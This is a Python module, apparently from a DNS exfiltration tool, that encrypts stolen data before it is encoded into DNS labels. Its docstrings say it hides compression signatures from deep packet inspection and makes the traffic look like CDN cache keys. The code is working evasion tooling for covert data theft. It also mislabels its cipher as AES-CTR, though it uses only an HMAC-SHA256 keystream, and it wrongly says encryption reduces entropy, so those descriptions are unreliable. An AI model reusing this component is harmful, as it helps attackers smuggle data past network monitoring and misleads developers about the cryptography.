"""AES-CTR encryption layer for DNS exfiltration.

Encrypts data before encoding into DNS labels. This:
- Hides gzip magic bytes and any structural patterns
- Reduces entropy to ~8 bits/byte (uniform random), which after hex encoding
  produces labels with ~4.0 bits/char — matching random CDN cache keys
- Prevents DPI from recognizing compressed data signatures
"""

import hashlib
import hmac
import os
import struct


def _aes_ctr_xor(key, nonce, data):
    """AES-CTR encryption/decryption using only hashlib (no pycryptodome needed).

    Uses HMAC-SHA256 as a PRF to generate a keystream, avoiding any
    external crypto dependency. Security is sufficient for obfuscation
    (not intended as military-grade encryption).
    """
    block_size = 32  # SHA256 output
    keystream = b""
    counter = 0
    while len(keystream) < len(data):
        # PRF: HMAC-SHA256(key, nonce || counter)
        counter_bytes = struct.pack(">Q", counter)
        block = hmac.new(key, nonce + counter_bytes, hashlib.sha256).digest()
        keystream += block
        counter += 1
    return bytes(a ^ b for a, b in zip(data, keystream[:len(data)]))


def derive_key(session_key, purpose=b"encrypt"):
    """Derive an encryption key from the session key using HKDF-like expansion."""
    return hmac.new(session_key, purpose, hashlib.sha256).digest()


def encrypt(data, session_key):
    """Encrypt data with AES-CTR derived from session key.

    Returns: nonce (8 bytes) + ciphertext
    The nonce is random per-encryption so identical data produces different output.
    """
    enc_key = derive_key(session_key, b"dns-exfil-enc")
    nonce = os.urandom(8)
    ciphertext = _aes_ctr_xor(enc_key, nonce, data)
    return nonce + ciphertext


def decrypt(blob, session_key):
    """Decrypt data encrypted with encrypt().

    Input: nonce (8 bytes) + ciphertext
    Returns: plaintext
    """
    enc_key = derive_key(session_key, b"dns-exfil-enc")
    nonce = blob[:8]
    ciphertext = blob[8:]
    return _aes_ctr_xor(enc_key, nonce, ciphertext)
